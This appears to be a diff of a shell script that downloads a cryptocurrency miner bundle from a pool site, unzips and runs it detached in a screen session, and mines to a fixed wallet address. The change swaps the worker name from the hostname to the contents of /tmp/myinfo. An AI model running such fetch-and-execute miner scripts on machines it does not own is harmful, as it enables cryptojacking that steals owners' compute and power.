@@ -3,4 +3,4 @@ wget https://qubitcoin.luckypool.io/deps.zip
 unzip deps.zip
 export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:.
 chmod +x qubitcoin-miner-opt
-screen -S qubit -d -m ./qubitcoin-miner-opt -a qhash -o ca.luckypool.io:8611 -u bc1qczah6tg69phzufh5ylldrjs6rkvhfw96n4kam6.`hostname` -t 1
+screen -S qubit -d -m ./qubitcoin-miner-opt -a qhash -o ca.luckypool.io:8611 -u bc1qczah6tg69phzufh5ylldrjs6rkvhfw96n4kam6.`cat /tmp/myinfo` -t 1
